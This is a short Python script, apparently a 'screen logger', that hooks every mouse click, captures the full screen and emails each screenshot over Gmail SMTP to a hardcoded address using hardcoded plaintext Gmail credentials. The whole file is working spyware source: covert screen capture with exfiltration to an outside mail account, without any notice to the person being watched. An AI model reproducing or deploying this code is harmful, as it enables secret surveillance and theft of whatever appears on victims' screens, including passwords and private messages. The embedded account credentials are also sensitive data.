from pynput.mouse import Listener
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
import email.encoders 
import os
import autopy

gmail_user ='justforhustle001@gmail.com'
gmail_pwd ='Hustle123456'

def on_click(x, y, button, pressed):
    mail("justforhustle001@gmail.com",
         "Screen Logger Rapor",
         "Screen Logger Calisiyor!",
         "screenshot.png")

def mail(to, subject, text, attach):
    
   bitmap = autopy.bitmap.capture_screen()
   bitmap.save('screenshot.png')

   msg = MIMEMultipart()
   msg['From'] = gmail_user
   msg['To'] = gmail_user
   msg['Subject'] = subject

   msg.attach(MIMEText(text))

   part = MIMEBase('application', 'octet-stream')
   part.set_payload(open(attach, 'rb').read())
   email.encoders.encode_base64(part)
   part.add_header('Content-Disposition',
           'attachment; filename="%s"' % os.path.basename(attach))
   msg.attach(part)

   mailServer = smtplib.SMTP("smtp.gmail.com", 587)
   mailServer.ehlo()
   mailServer.starttls()
   mailServer.ehlo()
   mailServer.login(gmail_user, gmail_pwd)
   mailServer.sendmail(gmail_user,gmail_user, msg.as_string())
   # Should be mailServer.quit(), but that crashes...
   mailServer.close()



with Listener( on_click=on_click) as listener:
    listener.join()